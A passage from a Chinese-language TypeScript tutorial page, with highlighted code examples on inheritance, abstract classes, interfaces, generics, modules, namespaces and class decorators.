<span>Person</span><span>(</span><span>\"张三\"</span><span>)</span><span>;</span>\np<span>.</span><span>setName</span><span>(</span><span>\"李四\"</span><span>)</span><span>;</span>\n<span>console</span><span>.</span><span>log</span><span>(</span>p<span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"继承\" tabindex=\"-1\"> 继承</h2>\n<div><pre><code><span>class</span> <span>Son</span> <span>extends</span> <span>Person</span> <span>{</span>\n  <span>// 静态属性</span>\n  <span>public</span> <span>static</span> age<span>:</span> <span>number</span> <span>=</span> <span>18</span><span>;</span>\n  <span>// 学校</span>\n  <span>public</span> school<span>:</span> <span>string</span><span>;</span>\n  <span>//构造方法</span>\n  <span>constructor</span><span>(</span>name<span>:</span> <span>string</span><span>,</span> school<span>:</span> <span>string</span><span>)</span> <span>{</span>\n    <span>// 访问派生类的构造函数中的 \"this\" 前, 必须调用 \"super\",初始化父类构造函数 --并把参数传给父类</span>\n    <span>super</span><span>(</span>name<span>)</span><span>;</span>\n    <span>//把传进来的school赋值给全局变量</span>\n    <span>this</span><span>.</span>school <span>=</span> school<span>;</span>\n  <span>}</span>\n  <span>//静态方法</span>\n  <span>static</span> <span>run</span><span>(</span>name<span>:</span> <span>string</span><span>)</span><span>:</span> <span>string</span> <span>{</span>\n    <span>return</span> <span><span>`</span><span><span>${</span>name<span>}</span></span><span>在跑步,他的年龄才</span><span><span>${</span><span>this</span><span>.</span>age<span>}</span></span><span>`</span></span><span>;</span>\n  <span>}</span>\n<span>}</span>\n\n<span>let</span> son <span>=</span> <span>new</span> <span>Son</span><span>(</span><span>\"王五\"</span><span>,</span> <span>\"清华大学\"</span><span>)</span><span>;</span>\nson<span>.</span><span>setName</span><span>(</span><span>\"赵六\"</span><span>)</span><span>;</span> <span>// 私有类也不能在子类的外部访问,但可通过公开的方法中进行赋值和访问</span>\n<span>console</span><span>.</span><span>log</span><span>(</span>son<span>)</span><span>;</span>\n<span>console</span><span>.</span><span>log</span><span>(</span>Son<span>.</span><span>run</span><span>(</span><span>\"方七\"</span><span>)</span><span>)</span><span>;</span>\n<span>console</span><span>.</span><span>log</span><span>(</span>Son<span>.</span>age<span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>\n<ol>\n<li>public 在当前类里面, 子类, 类外面都可以访问</li>\n<li>protected 在当前类和子类内部可以访问, 类外部无法访问</li>\n<li>private 在当前类内部可访问, 子类, 类外部都无法访问。</li>\n<li>属性不加修饰符,默认就是公有的 (public)</li>\n</ol>\n</div>\n<h2 id=\"多态\" tabindex=\"-1\"> 多态</h2>\n<p>通过抽象方法/方法重载--实现多态--多态的作用是用来定义标准</p>\n<div><pre><code><span>// 抽象父类</span>\n<span>abstract</span> <span>class</span> <span>Animal</span> <span>{</span>\n  <span>private</span> name<span>:</span> <span>string</span><span>;</span>\n  <span>constructor</span><span>(</span>name<span>:</span> <span>string</span><span>)</span> <span>{</span>\n    <span>this</span><span>.</span>name <span>=</span> name<span>;</span>\n  <span>}</span>\n  <span>//抽象成员--方法</span>\n  <span>abstract</span> <span>eat</span><span>(</span><span>)</span><span>:</span> <span>any</span><span>;</span>\n  <span>//抽象成员--属性</span>\n  <span>protected</span> <span>abstract</span> ages<span>:</span> Number<span>;</span>\n  <span>sleep</span><span>(</span><span>)</span><span>:</span> <span>void</span> <span>{</span>\n    <span>console</span><span>.</span><span>log</span><span>(</span><span>\"睡觉\"</span><span>)</span><span>;</span>\n  <span>}</span>\n<span>}</span>\n\n<span>class</span> <span>cat</span> <span>extends</span> <span>Animal</span> <span>{</span>\n  ages<span>:</span> Number <span>=</span> <span>2</span><span>;</span>\n  <span>constructor</span><span>(</span>name<span>:</span> <span>string</span><span>)</span> <span>{</span>\n    <span>super</span><span>(</span>name<span>)</span><span>;</span>\n  <span>}</span>\n  <span>//非抽象类“cat”不会自动实现继承自“Animal”类的抽象成员“eat”,  必须手动定义父类中的抽象方法--多态</span>\n  <span>eat</span><span>(</span><span>)</span><span>:</span> <span>string</span> <span>{</span>\n    <span>return</span> <span>\"猫吃鱼\"</span><span>;</span>\n  <span>}</span>\n\n  <span>//多态</span>\n  <span>sleep</span><span>(</span><span>)</span><span>:</span> <span>string</span> <span>{</span>\n    <span>return</span> <span>\"猫在睡觉\"</span><span>;</span>\n  <span>}</span>\n<span>}</span>\n\n<span>console</span><span>.</span><span>log</span><span>(</span><span>new</span> <span>cat</span><span>(</span><span>\"33\"</span><span>)</span><span>.</span><span>sleep</span><span>(</span><span>)</span><span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>\n<p>抽象类无法实例化。非抽象类继承抽象父类时不会自动实现来自父类的抽象成员,必须手动定义父类中的抽象成员, 否则报错。抽象成员包括属性和方法</p>\n</div>\n<h2 id=\"接口\" tabindex=\"-1\"> 接口</h2>\n<p>在面向对象的编程中, 接口是一种规范的定义, 它定义了行为和动作的规范,</p>\n<p>在程序设计里面, 接口起到一种限制和规范的作用。</p>\n<p>接口定义了某一批类所需要遵守的规范, 接口不关心这些类的内部状态数据, 也不关心这些类里方法的实现细节, 它只规定这批类里必须提供某些方法, 提供这些方法的类就可以满足实际需要。ts 中的接口类似于 java, 同时还增加了更灵活的接口类型, 包括属性、函数、可索引和类等。</p>\n<h3 id=\"属性接口\" tabindex=\"-1\"> 属性接口</h3>\n<div><pre><code><span>interface</span> <span>InterfaceName</span> <span>{</span>\n  first<span>:</span> <span>string</span><span>;</span>\n  second<span>?</span><span>:</span> <span>string</span><span>;</span> <span>//加个问号, 接口属性就可以变成可传可不传了, 不传默认是undefined。</span>\n<span>}</span>\n<span>//打印变量</span>\n<span>function</span> <span>logParam</span><span>(</span>name<span>:</span> InterfaceName<span>)</span><span>:</span> <span>void</span> <span>{</span>\n  <span>console</span><span>.</span><span>log</span><span>(</span>name<span>.</span>first<span>,</span> name<span>.</span>second<span>,</span> <span>11</span><span>)</span><span>;</span>\n<span>}</span>\n<span>//定义参数</span>\n<span>const</span> obj <span>=</span> <span>{</span> first<span>:</span> <span>\"1\"</span><span>,</span> second<span>:</span> <span>\"fff\"</span><span>,</span> three<span>:</span> <span>1</span> <span>}</span><span>;</span>\n<span>//logParam({ first: \"1\", second: \"1\", three: 1 }); //报错,只能传接口定义的值</span>\n<span>logParam</span><span>(</span>obj<span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>\n<p>用个变量来存储传入的变量,这样可以传入定义的接口以外的值, 否则如果直接传入对象中无接口定义的值会报错, 所以建议接口定义了哪些值就传哪些值。</p>\n</div>\n<h3 id=\"函数类型接口\" tabindex=\"-1\"> 函数类型接口</h3>\n<p>对方法传入的参数类型,以及返回值类型进行约束,可批量进行约束。</p>\n<div><pre><code><span>interface</span> <span>keyMap</span> <span>{</span>\n  <span>(</span>key<span>:</span> <span>string</span><span>,</span> value<span>:</span> <span>string</span><span>)</span><span>:</span> <span>string</span><span>;</span>\n<span>}</span>\n<span>let</span> logKeyMap<span>:</span> <span>keyMap</span> <span>=</span> <span>function</span> <span>(</span>key1<span>:</span> <span>string</span><span>,</span> value<span>:</span> <span>string</span><span>)</span><span>:</span> <span>string</span> <span>{</span>\n  <span>return</span> key1 <span>+</span> value<span>;</span>\n<span>}</span><span>;</span>\n<span>console</span><span>.</span><span>log</span><span>(</span><span>logKeyMap</span><span>(</span><span>\"key1\"</span><span>,</span> <span>\"value\"</span><span>)</span><span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>\n<p>接口只对传入的参数的类型和参数的个数进行约束, 不对参数名称进行约束。</p>\n</div>\n<h3 id=\"可索引接口\" tabindex=\"-1\"> 可索引接口</h3>\n<h4 id=\"约束数组\" tabindex=\"-1\"> 约束数组</h4>\n<div><pre><code><span>interface</span> <span>Arr</span> <span>{</span>\n  <span>[</span>index<span>:</span> <span>number</span><span>]</span><span>:</span> <span>string</span><span>;</span>\n<span>}</span>\n<span>let</span> ss<span>:</span> Arr <span>=</span> <span>[</span><span>\"2121\"</span><span>]</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><h3 id=\"约束对象\" tabindex=\"-1\"> 约束对象</h3>\n<div><pre><code><span>interface</span> <span>Obj</span> <span>{</span>\n  <span>[</span>index<span>:</span> <span>string</span><span>]</span><span>:</span> <span>string</span><span>;</span>\n<span>}</span>\n\n<span>let</span> interfaceArr<span>:</span> Obj <span>=</span> <span>{</span> aa<span>:</span> <span>\"1\"</span> <span>}</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>\n<p>对数组进行约束,index 后必须跟着 number 类型。对对象进行约束,index 后必须跟着 string 类型索引签名参数类型必须为 &quot;string&quot; 或 &quot;number&quot;</p>\n</div>\n<h3 id=\"类类型接口\" tabindex=\"-1\"> 类类型接口</h3>\n<h4 id=\"对类进行约束-类似抽象类的实现\" tabindex=\"-1\"> 对类进行约束,类似抽象类的实现</h4>\n<div><pre><code><span>interface</span> <span>Animals</span> <span>{</span>\n  name<span>:</span> <span>string</span><span>;</span>\n  <span>eat</span><span>(</span><span>)</span><span>:</span> <span>void</span><span>;</span>\n<span>}</span>\n\n<span>class</span> <span>Dogs</span> <span>implements</span> <span>Animals</span> <span>{</span>\n  name<span>:</span> <span>string</span><span>;</span>\n  <span>constructor</span><span>(</span>name<span>:</span> <span>string</span><span>)</span> <span>{</span>\n    <span>this</span><span>.</span>name <span>=</span> name<span>;</span>\n  <span>}</span>\n  <span>eat</span><span>(</span><span>)</span> <span>{</span><span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id=\"接口继承-接口可以继承接口\" tabindex=\"-1\"> 接口继承--接口可以继承接口</h4>\n<div><pre><code><span>interface</span> <span>Dog</span> <span>{</span>\n  <span>eat</span><span>(</span><span>)</span><span>:</span> <span>void</span><span>;</span>\n<span>}</span>\n\n<span>interface</span> <span>Persons</span> <span>extends</span> <span>Dog</span> <span>{</span>\n  <span>work</span><span>(</span><span>)</span><span>:</span> <span>void</span><span>;</span>\n<span>}</span>\n\n<span>class</span> <span>Cat</span> <span>{</span>\n  <span>code</span><span>(</span><span>)</span> <span>{</span>\n    <span>console</span><span>.</span><span>log</span><span>(</span><span>\"猫在敲代码\"</span><span>)</span><span>;</span>\n  <span>}</span>\n<span>}</span>\n\n<span>//可继承类后再实现接口</span>\n<span>class</span> <span>SuperMan</span> <span>extends</span> <span>Cat</span> <span>implements</span> <span>Persons</span> <span>{</span>\n  <span>eat</span><span>(</span><span>)</span><span>:</span> <span>void</span> <span>{</span>\n    <span>console</span><span>.</span><span>log</span><span>(</span><span>1</span><span>)</span><span>;</span>\n  <span>}</span>\n  <span>work</span><span>(</span><span>)</span><span>:</span> <span>void</span> <span>{</span>\n    <span>console</span><span>.</span><span>log</span><span>(</span><span>2</span><span>)</span><span>;</span>\n  <span>}</span>\n<span>}</span>\n<span>let</span> superMan <span>=</span> <span>new</span> <span>SuperMan</span><span>(</span><span>)</span><span>;</span>\nsuperMan<span>.</span><span>code</span><span>(</span><span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>\n<p>类接口会对类的属性和方法进行约束, 类似非抽象类继承抽象类时必须实现某些方法和属性, 但对属性和方法的类型的约束更加严格, 除了方法 void 类型可被重新定义外, 其他属性或方法的类型定义需要和接口保持一致</p>\n</div>\n<h2 id=\"泛型\" tabindex=\"-1\"> 泛型</h2>\n<p>软件工程中, 我们不仅要创建一致的定义良好的 api, 同时也要考虑可重用性。组件不仅能够支持当前的数据类型, 同时也能支持未来的数据类型, 这在创建大型系统时为你提供了十分灵活的功能</p>\n<p>泛型就是解决类、接口、方法的复用性, 以及对不特定数据类型的支持。</p>\n<p>要求:传入的参数和返回的参数一致</p>\n<h3 id=\"函数的泛型\" tabindex=\"-1\"> 函数的泛型</h3>\n<div><pre><code><span>function</span> <span><span>getDate</span><span><span>&lt;</span><span>T</span><span>></span></span></span><span>(</span>value<span>:</span> <span>T</span><span>)</span><span>:</span> <span>T</span> <span>{</span>\n  <span>return</span> value<span>;</span>\n<span>}</span>\n<span>console</span><span>.</span><span>log</span><span>(</span><span><span>getDate</span><span><span>&lt;</span><span>number</span><span>></span></span></span><span>(</span><span>123</span><span>)</span><span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>\n<p>这里的 T 可改成其他任意值但定义的值, 和传入的参数以及返回的参数是一样的,一般默认写法是 T, 也是业内规范的选择。</p>\n</div>\n<h3 id=\"类的泛型\" tabindex=\"-1\"> 类的泛型</h3>\n<div><pre><code><span>class</span> <span>MinClass<span>&lt;</span><span>T</span><span>></span></span> <span>{</span>\n  <span>public</span> list<span>:</span> <span>T</span><span>[</span><span>]</span> <span>=</span> <span>[</span><span>]</span><span>;</span>\n  <span>//添加</span>\n  <span>add</span><span>(</span>value<span>:</span> <span>T</span><span>)</span><span>:</span> <span>void</span> <span>{</span>\n    <span>this</span><span>.</span>list<span>.</span><span>push</span><span>(</span>value<span>)</span><span>;</span>\n  <span>}</span>\n\n  <span>//求最小值</span>\n  <span>min</span><span>(</span><span>)</span><span>:</span> <span>T</span> <span>{</span>\n    <span>//假设这个值最小</span>\n    <span>let</span> minNum <span>=</span> <span>this</span><span>.</span>list<span>[</span><span>0</span><span>]</span><span>;</span>\n    <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> <span>this</span><span>.</span>list<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>\n      <span>//比较并获取最小值</span>\n      minNum <span>=</span> minNum <span>&lt;</span> <span>this</span><span>.</span>list<span>[</span>i<span>]</span> <span>?</span> minNum <span>:</span> <span>this</span><span>.</span>list<span>[</span>i<span>]</span><span>;</span>\n    <span>}</span>\n    <span>return</span> minNum<span>;</span>\n  <span>}</span>\n<span>}</span>\n<span>//实例化类 并且指定了类的T的类型是number</span>\n<span>let</span> minClass <span>=</span> <span>new</span> <span>MinClass<span>&lt;</span><span>number</span><span>></span></span><span>(</span><span>)</span><span>;</span>\nminClass<span>.</span><span>add</span><span>(</span><span>23</span><span>)</span><span>;</span>\nminClass<span>.</span><span>add</span><span>(</span><span>5</span><span>)</span><span>;</span>\nminClass<span>.</span><span>add</span><span>(</span><span>2</span><span>)</span><span>;</span>\n<span>console</span><span>.</span><span>log</span><span>(</span>minClass<span>.</span><span>min</span><span>(</span><span>)</span><span>)</span><span>;</span>\n<span>//实例化类 并且指定了类的T的类型是string, 则其方法的传参和返回都是string类型</span>\n<span>let</span> minClass2 <span>=</span> <span>new</span> <span>MinClass<span>&lt;</span><span>string</span><span>></span></span><span>(</span><span>)</span><span>;</span>\nminClass2<span>.</span><span>add</span><span>(</span><span>\"23\"</span><span>)</span><span>;</span>\nminClass2<span>.</span><span>add</span><span>(</span><span>\"5\"</span><span>)</span><span>;</span>\nminClass2<span>.</span><span>add</span><span>(</span><span>\"2\"</span><span>)</span><span>;</span>\n<span>console</span><span>.</span><span>log</span><span>(</span>minClass2<span>.</span><span>min</span><span>(</span><span>)</span><span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"接口的泛型\" tabindex=\"-1\"> 接口的泛型</h3>\n<h4 id=\"第一种写法\" tabindex=\"-1\"> 第一种写法</h4>\n<div><pre><code><span>interface</span> <span>ConfigFn</span> <span>{</span>\n  <span>//规范参数类型,返回值类型</span>\n  <span>&lt;</span><span>T</span><span>></span><span>(</span>value<span>:</span> <span>T</span><span>)</span><span>:</span> <span>T</span><span>;</span>\n<span>}</span>\n\n<span>let</span> getData<span>:</span> <span>ConfigFn</span> <span>=</span> <span>function</span> <span>&lt;</span><span>T</span><span>></span><span>(</span>value<span>:</span> <span>T</span><span>)</span><span>:</span> <span>T</span> <span>{</span>\n  <span>return</span> value<span>;</span>\n<span>}</span><span>;</span>\n\n<span>console</span><span>.</span><span>log</span><span>(</span><span><span>getData</span><span><span>&lt;</span><span>string</span><span>></span></span></span><span>(</span><span>\"z11\"</span><span>)</span><span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id=\"第二种写法\" tabindex=\"-1\"> 第二种写法</h4>\n<div><pre><code><span>interface</span> <span>ConfigFn<span>&lt;</span><span>T</span><span>></span></span> <span>{</span>\n  <span>//参数类型 , 返回值类型</span>\n  <span>(</span>value<span>:</span> <span>T</span><span>)</span><span>:</span> <span>T</span><span>;</span>\n<span>}</span>\n\n<span>//接口方法</span>\n<span>function</span> <span><span>getData</span><span><span>&lt;</span><span>T</span><span>></span></span></span><span>(</span>value<span>:</span> <span>T</span><span>)</span><span>:</span> <span>T</span> <span>{</span>\n  <span>return</span> value<span>;</span>\n<span>}</span>\n\n<span>//使用接口</span>\n<span>let</span> myGetDate<span>:</span> ConfigFn<span>&lt;</span><span>string</span><span>></span> <span>=</span> getData<span>;</span>\n<span>console</span><span>.</span><span>log</span><span>(</span><span>myGetDate</span><span>(</span><span>\"3\"</span><span>)</span><span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>\n<p>接口的泛型只针对函数类型的接口</p>\n</div>\n<h3 id=\"类当做参数传入泛型类\" tabindex=\"-1\"> 类当做参数传入泛型类</h3>\n<div><pre><code><span>//用户类--和数据库表字段进行映射</span>\n<span>class</span> <span>User</span> <span>{</span>\n  username<span>:</span> <span>string</span> <span>|</span> <span>undefined</span><span>;</span>\n  password<span>:</span> <span>string</span> <span>|</span> <span>undefined</span><span>;</span>\n  <span>//构造函数-初始化参数</span>\n  <span>constructor</span><span>(</span>param<span>:</span> <span>{</span>\n    username<span>:</span> <span>string</span> <span>|</span> <span>undefined</span><span>;</span>\n    password<span>?</span><span>:</span> <span>string</span> <span>|</span> <span>undefined</span><span>;</span>\n  <span>}</span><span>)</span> <span>{</span>\n    <span>this</span><span>.</span>username <span>=</span> param<span>.</span>username<span>;</span>\n    <span>this</span><span>.</span>password <span>=</span> param<span>.</span>password<span>;</span>\n  <span>}</span>\n<span>}</span>\n\n<span>//数据库类</span>\n<span>class</span> <span>Db<span>&lt;</span><span>T</span><span>></span></span> <span>{</span>\n  <span>add</span><span>(</span>user<span>:</span> <span>T</span><span>)</span><span>:</span> <span>boolean</span> <span>{</span>\n    <span>console</span><span>.</span><span>log</span><span>(</span>user<span>)</span><span>;</span>\n    <span>return</span> <span>true</span><span>;</span>\n  <span>}</span>\n  <span>updated</span><span>(</span>user<span>:</span> <span>T</span><span>,</span> id<span>:</span> <span>number</span><span>)</span><span>:</span> <span>boolean</span> <span>{</span>\n    <span>console</span><span>.</span><span>log</span><span>(</span>user<span>,</span> id<span>)</span><span>;</span>\n    <span>return</span> <span>true</span><span>;</span>\n  <span>}</span>\n<span>}</span>\n\n<span>let</span> u <span>=</span> <span>new</span> <span>User</span><span>(</span><span>{</span>\n  username<span>:</span> <span>\"张三\"</span><span>,</span>\n<span>}</span><span>)</span><span>;</span>\n\n<span>//u.username = \"李四\";</span>\nu<span>.</span>password <span>=</span> <span>\"111111\"</span><span>;</span>\n<span>let</span> db <span>=</span> <span>new</span> <span>Db<span>&lt;</span>User<span>></span></span><span>(</span><span>)</span><span>;</span>\ndb<span>.</span><span>add</span><span>(</span>u<span>)</span><span>;</span>\ndb<span>.</span><span>updated</span><span>(</span>u<span>,</span> <span>1</span><span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>\n<p>类的参数名和类型都做了约束。</p>\n</div>\n<h2 id=\"模块\" tabindex=\"-1\"> 模块</h2>\n<p>内部模块称为命名空间, 外部模块简称为模块, 模块在其自身的作用域里执行, 而不是在全局作用域里;</p>\n<p>这意味着定义在一个模块里的变量、函数、类等等在模块外部是不可见的, 除非你明确的使用<code>export</code>形式之一导出它们。</p>\n<p>相反, 如果想使用其它模块导出的变量, 函数, 类, 接口等的时候, 你必须要导人它们, 可以使用<code>import</code>形式之一。</p>\n<p>我们可以一些公共的功能单独抽离成一个文件作为一个模块。模块里面的变量、函数、类等默认是私有的, 如果我们要在外部访问模块里面的数据(变量、函数、类) 我们需要通过<code>export</code>暴露模块里面的数据(变量、函数、类...)。暴露后我们通过<code>import</code>引入模块就可以使用模块里面暴露的数据(变量、函数、类...)</p>\n<div><pre><code><span>//modules/db.ts</span>\n<span>function</span> <span>getDate</span><span>(</span><span>)</span><span>:</span> <span>any</span><span>[</span><span>]</span> <span>{</span>\n  <span>console</span><span>.</span><span>log</span><span>(</span><span>\"获取数据\"</span><span>)</span><span>;</span>\n  <span>return</span> <span>[</span>\n    <span>{</span>\n      userName<span>:</span> <span>\"张三\"</span><span>,</span>\n    <span>}</span><span>,</span>\n    <span>{</span>\n      userName<span>:</span> <span>\"李四\"</span><span>,</span>\n    <span>}</span><span>,</span>\n  <span>]</span><span>;</span>\n<span>}</span>\n\n<span>//一个模块里面可以用多次</span>\n<span>// export { getDate };</span>\n<span>//一个模块里面只能用一次</span>\n<span>export</span> <span>default</span> getDate<span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><pre><code><span>import</span> <span>{</span> getDate <span>as</span> getDbDate <span>}</span> <span>from</span> <span>\"./modules/db\"</span><span>;</span>\n<span>import</span> getDbDate <span>from</span> <span>\"./modules/db\"</span><span>;</span>\n<span>getDbDate</span><span>(</span><span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><div><p>提示</p>\n<p>这个调试时浏览器中不能直接使用,可在<code>node</code>和<code>weakpack</code>的环境中调试。</p>\n</div>\n<h2 id=\"命名空间\" tabindex=\"-1\"> 命名空间</h2>\n<p>在代码量较大的情况下, 为了避免各种变量命名相冲突, 可将相似功能的函数、类、接口等放置到命名空间内 TypeScript 的命名空间可以将代码包裹起来, 只对外暴露需要在外部访问的对象。</p>\n<p>命名空间和模块的区别</p>\n<ul>\n<li>命名空间：内部模块, 主要用于组织代码, 避免命名冲突。</li>\n<li>模块：ts 外部模块的简称, 侧重代码的复用, 一个模块里可能会有多个命名空间。</li>\n</ul>\n<div><pre><code><span>// modules/Animal.ts</span>\n<span>export</span> <span>namespace</span> <span>A</span> <span>{</span>\n  <span>interface</span> <span>Animal</span> <span>{</span>\n    name<span>:</span> String<span>;</span>\n    <span>eat</span><span>(</span><span>)</span><span>:</span> <span>void</span><span>;</span>\n  <span>}</span>\n\n  <span>export</span> <span>class</span> <span>Dog</span> <span>implements</span> <span>Animal</span> <span>{</span>\n    name<span>:</span> String<span>;</span>\n    <span>constructor</span><span>(</span>theName<span>:</span> <span>string</span><span>)</span> <span>{</span>\n      <span>this</span><span>.</span>name <span>=</span> theName<span>;</span>\n    <span>}</span>\n    <span>eat</span><span>(</span><span>)</span> <span>{</span>\n      <span>console</span><span>.</span><span>log</span><span>(</span><span>\"我是\"</span> <span>+</span> <span>this</span><span>.</span>name<span>)</span><span>;</span>\n    <span>}</span>\n  <span>}</span>\n<span>}</span>\n\n<span>export</span> <span>namespace</span> <span>B</span> <span>{</span>\n  <span>interface</span> <span>Animal</span> <span>{</span>\n    name<span>:</span> String<span>;</span>\n    <span>eat</span><span>(</span><span>)</span><span>:</span> <span>void</span><span>;</span>\n  <span>}</span>\n\n  <span>export</span> <span>class</span> <span>Dog</span> <span>implements</span> <span>Animal</span> <span>{</span>\n    name<span>:</span> String<span>;</span>\n    <span>constructor</span><span>(</span>theName<span>:</span> <span>string</span><span>)</span> <span>{</span>\n      <span>this</span><span>.</span>name <span>=</span> theName<span>;</span>\n    <span>}</span>\n    <span>eat</span><span>(</span><span>)</span> <span>{</span><span>}</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><pre><code><span>import</span> <span>{</span> <span>A</span><span>,</span> <span>B</span> <span>}</span> <span>from</span> <span>\"./modules/Animal\"</span><span>;</span>\n<span>let</span> ee <span>=</span> <span>new</span> <span><span>A</span></span><span>.</span><span>Dog</span><span>(</span><span>\"小贝\"</span><span>)</span><span>;</span>\nee<span>.</span><span>eat</span><span>(</span><span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h2 id=\"装饰器\" tabindex=\"-1\"> 装饰器</h2>\n<h3 id=\"类装饰器\" tabindex=\"-1\"> 类装饰器</h3>\n<p>类装饰器在类申明之前被申明(紧靠着类申明), 类装饰器应用于类构造函数, 可以用于监视, 修改或者替换类定义。</p>\n<div><pre><code><span>function</span> <span>logClass</span><span>(</span>params<span>:</span> <span>any</span><span>)</span> <span>{</span>\n  <span>console</span><span>.</span><span>log</span><span>(</span>params<span>)</span><span>;</span>\n  <span>//params 就是指代当前类--HttpClient</span>\n  params<span>.</span>prototype<span>.</span>apiUrl <span>=</span> <span>\"动态扩展属性\"</span><span>;</span>\n  params<span>.</span>prototype<span>.</span><span>run</span> <span>=</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>\n    <span>console</span><span>.</span><span>log</span><span>(</span><span>\"动态扩展方法\"</span><span>)</span><span>;</span>\n  <span>}</span><span>;</span>\n  params<span>.</span>prototype<span>.</span><span>getDate</span> <span>=</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>\n    <span>console</span><span>.</span><span>log</span><span>(</span><span>\"动态扩展方法2\"</span><span>)</span><span>;</span>\n  <span>}</span><span>;</span>\n<span>}</span>\n\n<span><span>@</span><span>logClass</span></span>\n<span>class</span> <span>HttpClient</span> <span>{</span>\n  <span>constructor</span><span>(</span><span>)</span> <span>{</span><span>}</span>\n  <span>getDate</span><span>(</span><span>)</span> <span>{</span>\n    <span>console</span><span>.</span><span>log</span><span>(</span><span>1</span><span>)</span><span>;</span>\n  <span>}</span>\n<span>}</span>\n\n<span>let</span> http<span>:</span> <span>any</span> <span>=</span> <span>new</span> <span>HttpClient</span><span>(</span><span>)</span><span>;</span>\n<span>console</span><span>.</span><span>log</span><span>(</span>http<span>.</span>apiUrl<span>)</span><span>;</span>\nhttp<span>.</span><span>run</span><span>(</span><span>)</span><span>;</span>\nhttp<span>.</span><span>getDate</span><span>(</span><span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>\n<p>装饰器会覆盖被装饰的类中的方法</p>\n</div>\n<h3 id=\"装饰器工厂\" tabindex=\"-1\"> 装饰器工厂</h3>\n<p>可传参的装饰器</p>\n<div><pre><code><span>function</span> <span>logClassB</span><span>(</span>param<span>:</span> <span>string</span><span>)</span> <span>{</span>\n  <span>return</span> <span>function</span> <span>(</span>target<span>:</span> <span>any</span><span>)</span> <span>{</span>\n    <span>console</span><span>.</span><span>log</span><span>(</span>target<span>,</span> <span>\"装饰器以下的类\"</span><span>)</span><span>;</span>\n    <span>console</span><span>.</span><span>log</span><span>(</span>param<span>,</span> <span>\"装饰器传进来的属性\"</span><span>)</span><span>;</span>\n  <span>}</span><span>;</span>\n<span>}</span>\n\n<span><span>@</span><span>logClassB</span></span><span>(</span><span>\"小慧\"</span><span>)</span>\n<span>class</span> <span>HttpClients</span> <span>{</span>\n  <span>constructor</span><span>(</span><span>)</span> <span>{</span><span>}</span>\n  <span>getDate</span><span>(</span><span>)</span> <span>{</span><span>}</span>\n<span>}</span>\n\n<span>let</span> https<span>:</span> 